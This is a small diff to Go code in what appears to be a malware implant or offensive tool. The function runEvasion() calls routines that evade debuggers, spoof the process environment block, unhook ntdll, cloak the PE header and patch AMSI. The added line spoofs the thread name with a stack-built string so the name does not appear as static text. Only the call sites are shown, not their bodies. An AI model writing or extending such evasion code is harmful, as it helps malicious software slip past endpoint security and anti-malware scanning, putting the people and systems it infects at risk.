@@ -9,6 +9,7 @@ func runEvasion() {
 	evadeDebugger()
 	hideThreadFromDebugger() // kernel-level: hide thread from debugger attach + reduce ETW-TI
 	spoofPEB()               // change visible process name/cmdline before any EDR check
+	spoofThreadName(stackStr('W', 'o', 'r', 'k', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd'))
 	unhookNtdll()            // clean NT stubs — must run before any NT-based patches
 	cloakPEHeader()
 	patchAMSI()
